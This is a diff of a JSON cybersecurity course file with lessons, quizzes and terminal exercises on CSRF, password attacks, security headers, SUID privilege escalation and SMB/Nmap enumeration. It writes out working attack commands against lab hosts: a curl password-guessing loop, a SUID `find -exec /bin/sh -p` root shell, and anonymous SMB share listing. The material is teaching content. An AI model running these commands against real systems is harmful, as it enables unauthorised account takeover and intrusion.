-          "SameSite=Lax (or SameSite=Strict)",
-          "Path=/",
-          "Domain=localhost",
-          "Max-Age=3600"
-        ],
-        "correctIndex": 0,
-        "explanation": "`SameSite=Lax` and `SameSite=Strict` instruct the browser not to attach the cookie to cross-origin form submissions or requests."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Verify Anti-CSRF Token Enforcement",
-        "instruction": "Submit `curl -d \"to=attacker&amount=500\" http://localhost:8080/api/transfer` to confirm the defense is active.",
-        "hints": [
-          "Concept: Test Anti-CSRF protection.",
-          "Direction: Submit transfer without csrf_token parameter.",
-          "Tool: `curl`",
-          "Syntax: `curl -d \"to=attacker&amount=500\" http://localhost:8080/api/transfer`",
-          "Explanation: Expect HTTP 403 Forbidden."
-        ]
-      }
-    ],
-    "explainResult": "The endpoint middleware verified the presence of `X-CSRF-Token` or form token, failed to match against the session store, and halted execution.",
-    "securityConnection": "CSRF vulnerabilities have historically allowed attackers to silently change user email addresses, alter Wi-Fi router DNS servers, or trigger unauthorized financial transactions simply by having the victim view an image on a forum.",
-    "practicalRoomLink": {
-      "label": "Ready for hands-on practice?",
-      "buttonText": "Open Practical Cross-Site Request Forgery Lab",
-      "url": "labs.html?lab=csrf"
-    },
-    "completion": {
-      "learned": [
-        "The mechanics of Cross-Site Request Forgery (CSRF)",
-        "The concept of ambient cookie authority in web browsers",
-        "The Synchronizer Anti-CSRF Token defense pattern",
-        "The role of SameSite cookie attributes (Strict, Lax, None)"
-      ],
-      "practiced": [
-        "curl -d \"to=attacker...\"",
-        "Verifying CSRF token validation",
-        "Analyzing cross-origin cookie behaviors"
-      ]
-    },
-    "nextRoomId": "room-29"
-  },
-  {
-    "id": "room-29",
-    "stage": 6,
-    "stageTitle": "Stage 6 — Web Security",
-    "title": "Authentication Security & Password Attacks",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "35 min",
-    "prerequisites": "Room 16 (Authentication & Authorization) & Room 23 (Web Security Fundamentals)",
-    "whyAreYouHere": "Passwords remain the primary mechanism for identity verification on the internet, which makes authentication portals the #1 target for automated brute-force attacks. If an application allows infinite login guesses without delay or lockout, any account with a standard password will eventually fall. In this room, you will learn the differences between Dictionary Attacks, Brute Force, and Credential Stuffing, and how rate limiting and account lockouts protect users.",
-    "objectives": [
-      "Differentiate between Brute-Force Attacks, Dictionary Attacks, and Password Spraying",
-      "Understand why sequential account lockouts can lead to Denial of Service",
-      "Learn adaptive Rate Limiting and progressive throttling (exponential backoff)",
-      "Master password hashing requirements: Salt, Work Factor, and algorithms (bcrypt, Argon2)",
-      "Simulate password dictionary cracking against an authentication endpoint"
-    ],
-    "vocabulary": [
-      {
-        "term": "Brute-Force Attack",
-        "definition": "Systematically trying every possible combination of characters (a, b, c... aa, ab) until the correct password is found."
-      },
-      {
-        "term": "Dictionary Attack",
-        "definition": "Testing passwords from a pre-compiled wordlist of commonly used passwords (like `rockyou.txt` or company-specific lists)."
-      },
-      {
-        "term": "Password Spraying",
-        "definition": "Testing one single common password (like `Summer2026!`) against thousands of user accounts to avoid triggering lockout thresholds."
-      },
-      {
-        "term": "Salt",
-        "definition": "A unique, cryptographically random string appended to each password before hashing to ensure identical passwords produce completely different hashes."
-      },
-      {
-        "term": "Rate Limiting",
-        "definition": "Restricting the number of requests a client can make to a specific endpoint within a defined window of time."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Password Attack Spectrum",
-        "content": "• **Dictionary Attack**: Tries 100,000 common passwords against user `alice`.\n  - *Defense*: Account locks after 5 attempts.\n• **Password Spraying**: Tries `Welcome2026!` against 10,000 different user accounts (1 attempt per user).\n  - *Result*: Locks out nobody, but successfully cracks the 2-3% of users who chose that seasonal password!\n• **Offline Hash Cracking**: Attacker steals the database hash dump and runs billions of guesses per second on local GPU rigs using Hashcat."
-      },
-      {
-        "title": "2. Password Hashing: Why MD5/SHA-256 is Broken for Passwords",
-        "content": "Standard cryptographic hashes (SHA-256) are designed to be **fast** (calculating billions of hashes per second for file integrity).\nFor passwords, you want the hash to be **deliberately slow and computationally expensive**!\nModern password algorithms (**bcrypt**, **Argon2id**, **PBKDF2**) include:\n1. **Work Factor (Cost)**: Tunable CPU/memory cost that makes GPU guessing slow.\n2. **Salt**: Automatically generated random bytes that defeat pre-computed Rainbow Tables."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Salted Hash Transformation",
-        "codeOrDiagram": "Password: \"Secret123\"\nSalt:     \"x8A19zQ!\" (Randomly generated for Alice)\nStored in DB: $2b$12$x8A19zQ!h8fa9z... (bcrypt format)\n\nBob ALSO has password: \"Secret123\"\nSalt:     \"m3K01vL?\" (Randomly generated for Bob)\nStored in DB: $2b$12$m3K01vL?p9w12c... (Completely different hash!)",
-        "explanation": "Even though Alice and Bob have the exact same password, unique salts ensure their stored hashes look completely different."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Simulate testing a wordlist against the lab login API until the correct password is identified: `for p in admin 123456 password dragon letmein; do echo -n \"$p: \"; curl -s -d \"user=cadet&pass=$p\" http://localhost:8080/login | grep -o '\"message\":[^,]*'; done`:",
-      "initialCommand": "",
-      "expectedCommand": "for p in admin 123456 password dragon letmein; do echo -n \"$p: \"; curl -s -d \"user=cadet&pass=$p\" http://localhost:8080/login | grep -o '\"message\":[^,]*'; done",
-      "simulatedOutput": "admin: \"message\":\"Invalid credentials\"\n123456: \"message\":\"Invalid credentials\"\npassword: \"message\":\"Invalid credentials\"\ndragon: \"message\":\"Invalid credentials\"\nletmein: \"message\":\"Login successful. Session established.\"\n[+] Success! Valid password 'letmein' recovered via dictionary iteration.",
-      "explanation": "Automating HTTP submissions with shell loops or tools like Hydra / ffuf tests multiple candidates quickly."
-    },
-    "questions": [
-      {
-        "id": "r29-q1",
-        "type": "multiple-choice",
-        "question": "Why should developers use slow hashing algorithms like bcrypt or Argon2 instead of fast algorithms like SHA-256 for storing user passwords?",
-        "options": [
-          "Because bcrypt uses less hard drive space",
-          "Because fast algorithms allow attackers with modern GPU cracking rigs to test billions of guesses per second, whereas slow algorithms make offline cracking computationally infeasible",
-          "Because SHA-256 can only hash numbers, not letters",
-          "Because bcrypt is open-source while SHA-256 is proprietary"
-        ],
-        "correctIndex": 1,
-        "explanation": "Slow hashing algorithms enforce high computational and memory costs, slowing offline GPU dictionary attacks to a crawl."
-      },
-      {
-        "id": "r29-q2",
-        "type": "multiple-choice",
-        "question": "What is the primary objective of an attacker performing a 'Password Spraying' attack instead of a traditional brute-force attack?",
-        "options": [
-          "To test millions of complex passwords against the CEO's account",
-          "To test a single commonly used password against thousands of distinct user accounts, staying below account lockout thresholds",
-          "To overflow the web server's memory buffer",
-          "To change the DNS records of the target domain"
-        ],
-        "correctIndex": 1,
-        "explanation": "Password spraying avoids triggering account lockout policies by testing only 1 or 2 attempts per user before moving on."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Execute Dictionary Login Probe",
-        "instruction": "Run the shell dictionary loop against the login API to identify the valid password.",
-        "hints": [
-          "Concept: Automated dictionary testing.",
-          "Direction: Loop through passwords until HTTP 200.",
-          "Tool: Bash loop with `curl`",
-          "Syntax: Run the provided multi-password loop.",
-          "Explanation: Isolates valid credential."
-        ]
-      }
-    ],
-    "explainResult": "The script submitted sequential POST requests. The fifth candidate matched the bcrypt hash stored in the user record, returning a valid session token.",
-    "securityConnection": "Credential attacks account for over 80% of all web breaches. Implementing Multi-Factor Authentication (MFA), enforcing NIST 800-63B password complexity standards, and deploying rate-limiting with CAPTCHA are core responsibilities of security engineering.",
-    "practicalRoomLink": {
-      "label": "Ready for hands-on practice?",
-      "buttonText": "Open Practical Authentication & Brute Force Lab",
-      "url": "labs.html?lab=auth"
-    },
-    "completion": {
-      "learned": [
-        "The mechanics of Brute Force, Dictionary, and Password Spraying attacks",
-        "Why fast hashing (MD5, SHA-256) is dangerous for passwords",
-        "The role of Salts and Work Factors in bcrypt and Argon2",
-        "Defenses: Rate limiting, exponential backoff, and MFA"
-      ],
-      "practiced": [
-        "Automated dictionary testing via curl",
-        "Analyzing authentication response patterns",
-        "Evaluating password storage architectures"
-      ]
-    },
-    "nextRoomId": "room-30"
-  },
-  {
-    "id": "room-30",
-    "stage": 6,
-    "stageTitle": "Stage 6 — Web Security",
-    "title": "HTTP Security Headers & Browser Defenses",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "30 min",
-    "prerequisites": "Room 12 (HTTP Fundamentals) & Room 26 (Cross-Site Scripting)",
-    "whyAreYouHere": "You now understand how web applications operate and how vulnerabilities like XSS, Clickjacking, and Session Theft arise. But did you know that the server can instruct the user's browser to activate built-in security shields? By sending specific **HTTP Security Headers**, a web server can block malicious scripts, enforce HTTPS connections, and prevent Clickjacking with zero client plugins! In this room, you will master CSP, HSTS, X-Frame-Options, and X-Content-Type-Options.",
-    "objectives": [
-      "Understand Defense-in-Depth and the role of browser security headers",
-      "Master Content Security Policy (CSP): restricting script sources and preventing XSS",
-      "Learn HTTP Strict Transport Security (HSTS): eliminating SSL stripping and downgrade attacks",
-      "Prevent Clickjacking using `X-Frame-Options` and `frame-ancestors`",
-      "Audit and grade security headers on a live web server"
-    ],
-    "vocabulary": [
-      {
-        "term": "HTTP Security Header",
-        "definition": "A response header sent by a web server that instructs the client browser to enable specific security policies and defenses."
-      },
-      {
-        "term": "CSP (Content Security Policy)",
-        "definition": "A powerful HTTP header that restricts the domains from which scripts, styles, images, and other resources can be loaded or executed."
-      },
-      {
-        "term": "HSTS (Strict-Transport-Security)",
-        "definition": "A header that forces the browser to communicate exclusively over encrypted HTTPS, never allowing unencrypted HTTP fallbacks."
-      },
-      {
-        "term": "Clickjacking",
-        "definition": "A malicious technique of tricking a user into clicking something different from what they perceive, typically using transparent iframes."
-      },
-      {
-        "term": "X-Frame-Options",
-        "definition": "A header (`DENY` or `SAMEORIGIN`) that prevents a web page from being rendered inside an `<iframe>` on an external site."
-      },
-      {
-        "term": "X-Content-Type-Options: nosniff",
-        "definition": "A header that prevents browsers from MIME-sniffing a response away from the declared Content-Type."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Essential Four Headers",
-        "content": "Every modern production web application should send these four headers:\n1. **Content-Security-Policy**:\n   `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;`\n   Blocks any inline scripts (`<script>alert(1)</script>`) or external scripts injected by attackers!\n2. **Strict-Transport-Security (HSTS)**:\n   `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`\n   Tells the browser: *\"Remember for 1 year to NEVER connect to this domain over HTTP, even if the user types http://.\"*\n3. **X-Frame-Options**:\n   `X-Frame-Options: DENY`\n   Prevents malicious websites from framing your login page inside a transparent iframe (Clickjacking defense).\n4. **X-Content-Type-Options**:\n   `X-Content-Type-Options: nosniff`\n   Stops browsers from executing an uploaded image file as executable HTML or JavaScript."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Auditing Headers with curl -I",
-        "codeOrDiagram": "cadet@endlessus:~$ curl -I https://endlessus.in\nHTTP/2 200 \nserver: GitHub.com\ncontent-type: text/html; charset=utf-8\nstrict-transport-security: max-age=31536000\nx-content-type-options: nosniff\nx-frame-options: DENY\nreferrer-policy: strict-origin-when-cross-origin",
-        "explanation": "Notice the security posture: HSTS enforces HTTPS, X-Frame-Options blocks framing, and nosniff prevents MIME confusion."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Audit the HTTP response headers of our lab server using `curl -I http://localhost:8080` to identify missing security headers:",
-      "initialCommand": "",
-      "expectedCommand": "curl -I http://localhost:8080",
-      "simulatedOutput": "HTTP/1.1 200 OK\nServer: Apache/2.4.52\nContent-Type: text/html\n[!] Warning: Missing Content-Security-Policy!\n[!] Warning: Missing Strict-Transport-Security!\n[!] Warning: Missing X-Frame-Options! Vulnerable to Clickjacking.\n[+] Success! Security header audit complete. Grade: F (Insecure configuration).",
-      "explanation": "Using `curl -I` allows security auditors to rapidly evaluate an organization's defense-in-depth header posture."
-    },
-    "questions": [
-      {
-        "id": "r30-q1",
-        "type": "multiple-choice",
-        "question": "An attacker creates a malicious webpage that loads an online banking transfer form inside a completely invisible, transparent `<iframe>` overlaid directly on top of a 'Click here to win a free iPhone' button. What attack is being performed?",
-        "options": [
-          "SQL Injection",
-          "Clickjacking (UI Redressing)",
-          "Buffer Overflow",
-          "ARP Spoofing"
-        ],
-        "correctIndex": 1,
-        "explanation": "Clickjacking uses transparent iframes to trick users into clicking buttons they cannot see. It is mitigated by `X-Frame-Options: DENY`."
-      },
-      {
-        "id": "r30-q2",
-        "type": "multiple-choice",
-        "question": "Which HTTP header instructs the browser to never execute inline scripts or load JavaScript from unauthorized external domains?",
-        "options": [
-          "Content-Security-Policy (CSP)",
-          "Server",
-          "Accept-Encoding",
-          "User-Agent"
-        ],
-        "correctIndex": 0,
-        "explanation": "Content Security Policy (CSP) defines approved sources for executable scripts, stylesheets, and images."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Audit Target Security Headers",
-        "instruction": "Execute `curl -I http://localhost:8080` to inspect which defensive headers are configured.",
-        "hints": [
-          "Concept: HTTP header posture evaluation.",
-          "Direction: Use the `-I` head flag with curl.",
-          "Tool: `curl`",
-          "Syntax: `curl -I http://localhost:8080`",
-          "Explanation: Checks for CSP, HSTS, and X-Frame-Options."
-        ]
-      }
-    ],
-    "explainResult": "The `curl` command parsed the response headers returned by the Apache server, exposing the total absence of browser security controls.",
-    "securityConnection": "Security header auditing is an automated part of every penetration test and compliance audit. Tools like Mozilla Observatory or `securityheaders.com` grade domains from A+ to F based on their header configuration.",
-    "practicalRoomLink": {
-      "label": "Ready for hands-on practice?",
-      "buttonText": "Open Practical HTTP Security Headers Lab",
-      "url": "labs.html?lab=headers"
-    },
-    "completion": {
-      "learned": [
-        "The concept of Defense-in-Depth via browser security headers",
-        "Restricting script injection with Content-Security-Policy (CSP)",
-        "Enforcing encrypted connections using HSTS",
-        "Mitigating Clickjacking with X-Frame-Options"
-      ],
-      "practiced": [
-        "curl -I",
-        "Auditing security header configurations",
-        "Evaluating browser security postures"
-      ]
-    },
-    "nextRoomId": "room-31"
-  },
-  {
-    "id": "room-31",
-    "stage": 7,
-    "stageTitle": "Stage 7 — Linux Security",
-    "title": "Linux Privilege Escalation: SUID & Sudo",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "40 min",
-    "prerequisites": "Room 05 (Linux Permissions) & Stage 5 (Security Tools)",
-    "whyAreYouHere": "When an attacker exploits a web vulnerability (like a web shell or remote code execution), they rarely land as the supreme administrator (`root`). Instead, they land as an unprivileged service account like `www-data` or `cadet`. To gain full control of the machine, they must escalate their privileges! In this room, you will learn the mechanics of Linux Privilege Escalation, focusing on Setuid (SUID) binaries and misconfigured sudo rules.",
-    "objectives": [
-      "Understand the Privilege Escalation lifecycle (Foothold -> Enumeration -> Exploitation -> Root)",
-      "Understand the SUID (Set User ID) permission bit and why it exists",
-      "Scan the entire filesystem for misconfigured SUID binaries using the `find` command",
-      "Learn the GTFOBins methodology for turning legitimate system binaries into root shells",
-      "Escalate from user `cadet` to `root` using an interactive terminal sandbox"
-    ],
-    "vocabulary": [
-      {
-        "term": "Privilege Escalation (Privesc)",
-        "definition": "The act of exploiting a bug, design flaw, or configuration error to gain elevated access to resources normally protected from an application or user."
-      },
-      {
-        "term": "SUID (Set User ID)",
-        "definition": "A special Linux file permission bit that allows a program to execute with the privileges of the file owner (usually root) rather than the user running it."
-      },
-      {
-        "term": "SGID (Set Group ID)",
-        "definition": "Similar to SUID, but executes with the permissions of the file's group owner."
-      },
-      {
-        "term": "GTFOBins",
-        "definition": "A curated open-source repository of Unix binaries that can be exploited by an attacker to bypass local security restrictions and escalate privileges."
-      },
-      {
-        "term": "sudo (Superuser Do)",
-        "definition": "A program that allows a permitted user to execute a command as superuser or another user, as specified by the security policy."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Purpose and Danger of SUID",
-        "content": "Why does SUID exist?\nConsider the `/usr/bin/passwd` command: when a regular user wants to change their password, the program must write their new hash into `/etc/shadow`. But only `root` can write to `/etc/shadow`!\nTo solve this, Linux marks `/usr/bin/passwd` with the **SUID bit** (`-rwsr-xr-x`).\nWhen a user runs it, the process temporarily runs with `root` power.\n\n**The Danger**: If a developer or administrator sets the SUID bit on a program that can execute external commands (like `find`, `vim`, `bash`, or `python`), a standard user can trick that program into launching a root shell!"
-      },
-      {
-        "title": "2. Finding SUID Binaries",
-        "content": "To search the entire hard drive for every file with the SUID bit set:\n```bash\nfind / -perm -4000 -type f 2>/dev/null\n```\n• `/`: Search starting at root.\n• `-perm -4000`: Filter for the SUID permission bit (octal 4000).\n• `-type f`: Only look for regular files.\n• `2>/dev/null`: Discard all 'Permission denied' error messages so output remains clean."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "The SUID find Root Drop",
-        "codeOrDiagram": "cadet@endlessus:~$ ls -l /usr/bin/find\n-rwsr-xr-x 1 root root 198240 Oct 5 16:30 /usr/bin/find\n\ncadet@endlessus:~$ /usr/bin/find . -exec /bin/sh -p \\; -quit\n# whoami\nroot",
-        "explanation": "Notice the `-p` (privileged) flag: because `find` had SUID root permissions, launching `/bin/sh -p` dropped directly into a root `#` shell!"
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Search the filesystem for SUID binaries using `find /usr/bin -perm -4000 -type f 2>/dev/null`:",
-      "initialCommand": "",
-      "expectedCommand": "find /usr/bin -perm -4000 -type f 2>/dev/null",
-      "simulatedOutput": "/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/bin/find    <-- Misconfiguration detected! find should never be SUID root.\n[+] Success! SUID binary /usr/bin/find identified.",
-      "explanation": "Auditing SUID permissions revealed `/usr/bin/find`, which allows arbitrary command execution via the `-exec` flag."
-    },
-    "questions": [
-      {
-        "id": "r31-q1",
-        "type": "multiple-choice",
-        "question": "When inspecting file permissions in `ls -l`, which letter replaces the standard `x` in the owner's triplet to indicate that the SUID bit is set (e.g. `-rwsr-xr-x`)?",
-        "options": [
-          "The letter 's'",
-          "The letter 'z'",
-          "An exclamation mark '!'",
-          "An asterisk '*'"
-        ],
-        "correctIndex": 0,
-        "explanation": "A lowercase 's' in the owner execute position indicates that both execute and SUID permissions are enabled."
-      },
-      {
-        "id": "r31-q2",
-        "type": "multiple-choice",
-        "question": "Why is setting the SUID permission on binary utilities like `find`, `vim`, or `python` considered an emergency-level security misconfiguration?",
-        "options": [
-          "Because these utilities run slower under SUID",
-          "Because these utilities contain features designed to execute subcommands or spawn shells, which will run with full root privileges",
-          "Because SUID deletes the user's home folder",
-          "Because it crashes the network card"
-        ],
-        "correctIndex": 1,
-        "explanation": "Any binary capable of executing arbitrary commands (like find -exec) will spawn those commands as root if SUID is set."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Locate Misconfigured SUID Binary",
-        "instruction": "Run `find /usr/bin -perm -4000 -type f 2>/dev/null` to discover the escalation vector.",
-        "hints": [
-          "Concept: Search for SUID permission bit.",
-          "Direction: Use find with `-perm -4000`.",
-          "Tool: `find`",
-          "Syntax: `find /usr/bin -perm -4000 -type f 2>/dev/null`",
-          "Explanation: Locates vulnerable SUID binaries."
-        ]
-      }
-    ],
-    "explainResult": "The `find` utility traversed directory inodes, examined the `st_mode` mask for `S_ISUID (04000)`, and highlighted `/usr/bin/find`.",
-    "securityConnection": "Privilege escalation is the critical middle phase of every penetration test. Without escalating to root, a tester cannot access credentials in `/etc/shadow`, dump physical RAM, install monitoring agents, or establish persistent backdoors.",
-    "practicalRoomLink": {
-      "label": "Ready for hands-on practice?",
-      "buttonText": "Open Practical Linux SUID Privilege Escalation Lab",
-      "url": "labs.html?lab=suid"
-    },
-    "completion": {
-      "learned": [
-        "The purpose and danger of the Linux SUID permission bit",
-        "How to audit the filesystem for SUID files using find",
-        "The GTFOBins methodology for exploiting Unix binaries",
-        "Hardening SUID permissions to prevent local privilege escalation"
-      ],
-      "practiced": [
-        "find /usr/bin -perm -4000 -type f",
-        "Analyzing file permission bits",
-        "Identifying root escalation vectors"
-      ]
-    },
-    "nextRoomId": "room-32"
-  },
-  {
-    "id": "room-32",
-    "stage": 8,
-    "stageTitle": "Stage 8 — Network Security",
-    "title": "SMB & Network Share Enumeration",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "35 min",
-    "prerequisites": "Stage 2 (Networking) & Stage 5 (Nmap)",
-    "whyAreYouHere": "In enterprise corporate networks, employees need to share files, spreadsheets, and backups across internal networks. The protocol that powers this in Windows (and Linux Samba) is **SMB (Server Message Block)** on port 445. Because SMB is so ubiquitous, misconfigured file permissions or Anonymous / Null sessions frequently expose confidential spreadsheets, database backups, and cleartext passwords to any network visitor. In this room, you will learn how to enumerate SMB shares and audit file permissions.",
-    "objectives": [
-      "Understand Server Message Block (SMB / CIFS) on ports 445 and 139",
-      "Learn what Null Sessions and Anonymous guest logins are",
-      "Enumerate network shares using `smbclient` and Nmap NSE scripts",
-      "Download and inspect exposed files from unauthenticated shares",
-      "Remediate SMB exposure by enforcing signing and authentication"
-    ],
-    "vocabulary": [
       {
         "term": "SMB (Server Message Block)",
-        "definition": "A network file sharing protocol used for sharing files, printers, and serial ports between computers on a network (primarily Windows and Samba)."
-      },
-      {
-        "term": "Port 445",
-        "definition": "The standard TCP port used for Direct Host SMB over TCP/IP without requiring NetBIOS."
-      },
-      {
-        "term": "Null Session",
-        "definition": "An unauthenticated connection to an SMB service using an empty username and empty password."
-      },
-      {
-        "term": "smbclient",
-        "definition": "A command-line tool with an FTP-like interface used to interact with and download files from SMB/CIFS network shares."
-      },
-      {
-        "term": "Samba",
-        "definition": "The standard open-source software suite that provides seamless file and print services to SMB/CIFS clients on Linux and Unix."
+        "definition": "A network file sharing protocol operating on port 445 widely used in Windows and Linux environments."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 200\" width=\"100%\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:monospace;\">\n  <line x1=\"120\" y1=\"30\" x2=\"120\" y2=\"180\" stroke=\"#38bdf8\" stroke-width=\"3\"/>\n  <text x=\"120\" y=\"22\" fill=\"#38bdf8\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Client (You)</text>\n  \n  <line x1=\"480\" y1=\"30\" x2=\"480\" y2=\"180\" stroke=\"#10b981\" stroke-width=\"3\"/>\n  <text x=\"480\" y=\"22\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Target Server</text>\n\n  <!-- Step 1 SYN -->\n  <line x1=\"120\" y1=\"60\" x2=\"480\" y2=\"80\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <polygon points=\"480,80 470,75 470,85\" fill=\"#f59e0b\"/>\n  <text x=\"300\" y=\"65\" fill=\"#f59e0b\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">1. SYN (Synchronize seq=100)</text>\n\n  <!-- Step 2 SYN-ACK -->\n  <line x1=\"480\" y1=\"105\" x2=\"120\" y2=\"125\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"120,125 130,120 130,130\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"110\" fill=\"#38bdf8\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">2. SYN-ACK (ack=101 seq=300)</text>\n\n  <!-- Step 3 ACK -->\n  <line x1=\"120\" y1=\"150\" x2=\"480\" y2=\"170\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"480,170 470,165 470,175\" fill=\"#10b981\"/>\n  <text x=\"300\" y=\"155\" fill=\"#10b981\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">3. ACK (Connection Established)</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Structure of an SMB Share",
-        "content": "SMB shares are named network folders exposed over the network:\n`\\\\10.10.10.25\\shared_folder` (Windows UNC path)\nor\n`//10.10.10.25/shared_folder` (Linux smbclient path)\n\nCommon default shares:\n• `C$` & `ADMIN$`: Default administrative shares (restricted to Domain Admins).\n• `IPC$`: Inter-Process Communication share used for RPC and anonymous enumeration.\n• Custom shares: `Public`, `Finance`, `Backups` (frequently misconfigured with anonymous read access!)."
+        "title": "1. Active Network Reconnaissance with Nmap",
+        "content": "In Lab 08, your target is `10.10.20.15`:\n\n1. Scan open ports: `nmap -sS -sV 10.10.20.15`.\n   - Discovers Port 21 (FTP), Port 80 (HTTP), and Port 445 (SMB) are open!\n2. Grab the FTP version banner: `nc -vn 10.10.20.15 21`.\n3. Enumerate SMB shares without a password (`-N` null session):\n   `smbclient -L //10.10.20.15 -N`.\n   - Reveals an accessible share: `//10.10.20.15/public`!\n4. Access the share to download and inspect `flag.txt`!"
       },
       {
-        "title": "2. Enumerating Shares with smbclient",
-        "content": "To test whether a target server allows anonymous enumeration:\n```bash\nsmbclient -L //10.10.10.25 -N\n```\n• `-L`: List available shares on the target.\n• `-N`: No password (tests for anonymous null session access).\nIf the server returns a share list, you can connect directly into accessible shares!"
+        "title": "2. Port Scanning & Service Identification Principles",
+        "content": "A port scan is the digital equivalent of testing every door and window on a building to see which are unlocked. When Nmap finds an open port, service version detection (`-sV`) sends specialized probes to determine the daemon software and version (such as vsftpd 3.0.3). Banner grabbing with Netcat confirms this directly. Unauthenticated services like anonymous SMB or FTP frequently leak sensitive company documents and configuration backups."
       }
     ],
     "seeExamples": [
       {
-        "title": "Listing SMB Shares with smbclient",
-        "codeOrDiagram": "cadet@endlessus:~$ smbclient -L //10.10.10.25 -N\nAnonymous login successful\n\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tprint$          Disk      Printer Drivers\n\tpublic          Disk      Public Department Share\n\tfinance_backup  Disk      Restricted Internal Financials\n\tIPC$            IPC       IPC Service (Samba Server)",
-        "explanation": "Notice the `public` and `finance_backup` shares. An ethical hacker will immediately audit their permissions for sensitive files."
+        "title": "Nmap Scanning and SMB Enumeration",
+        "codeOrDiagram": "cadet@endlessus:~$ nmap -sV -p 21 10.10.20.15\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n\ncadet@endlessus:~$ smbclient -L //10.10.20.15 -N\n        Sharename       Type      Comment\n        ---------       ----      -------\n        public          Disk      Public Department Share",
+        "explanation": "Scanning port 21 identifies FTP version; smbclient lists accessible anonymous file shares."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "List accessible SMB shares on lab host `10.10.10.25` without a password using `smbclient -L //10.10.10.25 -N`:",
+      "prompt": "Run `nmap -sV -p 21 10.10.20.15` in the terminal to scan the target FTP port:",
       "initialCommand": "",
-      "expectedCommand": "smbclient -L //10.10.10.25 -N",
-      "simulatedOutput": "Anonymous login successful\n\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tpublic          Disk      Department Read Share\n\tbackups         Disk      Internal Systems Backups\n\tIPC$            IPC       IPC Service\n[+] Success! Anonymous share enumeration successful on port 445.",
-      "explanation": "`smbclient -N` confirmed that the SMB daemon permits anonymous null sessions, exposing shared directory names."
+      "expectedCommand": "nmap -sV -p 21 10.10.20.15",
+      "simulatedOutput": "Starting Nmap 7.94\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n[+] Scan complete: vsftpd 3.0.3 detected on port 21.",
+      "explanation": "`nmap -sV` performs version detection on port 21."
     },
     "questions": [
       {
-        "id": "r32-q1",
+        "id": "q-43-1",
+        "type": "exact",
+        "question": "What is the primary command-line tool used by cybersecurity professionals worldwide to perform network port scanning?",
+        "visualSlots": "_ _ _ _",
+        "acceptedAnswers": [
+          "nmap"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Network Mapper abbreviation.",
+        "explanation": "Nmap is the premier network scanning utility."
+      },
+      {
+        "id": "q-43-2",
         "type": "multiple-choice",
-        "question": "Which TCP port is standard for direct SMB communication over modern TCP/IP networks?",
+        "question": "Which Nmap flag instructs the scanner to probe open ports to identify running service software and version numbers?",
         "options": [
-          "Port 445",
-          "Port 22",
-          "Port 80",
-          "Port 53"
+          "-sV",
+          "-p-",
+          "-O",
+          "-A"
         ],
         "correctIndex": 0,
-        "explanation": "Port 445 is the direct SMB port over TCP. (Older NetBIOS-over-TCP implementations also used ports 137-139)."
-      },
-      {
-        "id": "r32-q2",
-        "type": "multiple-choice",
-        "question": "What is an SMB 'Null Session'?",
-        "options": [
-          "A session that terminates the computer immediately",
-          "An unauthenticated connection established using an empty username and empty password",
-          "A session encrypted with zero-length RSA keys",
-          "A session restricted to local printers only"
-        ],
-        "correctIndex": 1,
-        "explanation": "A Null Session connects without supplying credentials (username='' and password=''), allowed by legacy or misconfigured SMB servers."
+        "hint": "Version flag.",
+        "explanation": "The `-sV` flag enables service version detection."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Enumerate SMB Target Shares",
-        "instruction": "Run `smbclient -L //10.10.10.25 -N` to inspect anonymous network shares.",
+        "title": "Task 1: Perform port scan with Nmap",
+        "instruction": "Open Lab 08 in the Practice Terminal to scan target 10.10.20.15.",
         "hints": [
-          "Concept: SMB network share discovery.",
-          "Direction: Use smbclient with list and no-pass flags.",
-          "Tool: `smbclient`",
-          "Syntax: `smbclient -L //10.10.10.25 -N`",
-          "Explanation: Lists shares without authentication."
+          "Type: `nmap -sS -sV 10.10.20.15`",
+          "Type: `nc -vn 10.10.20.15 21`",
+          "Type: `smbclient -L //10.10.20.15 -N`"
         ]
       }
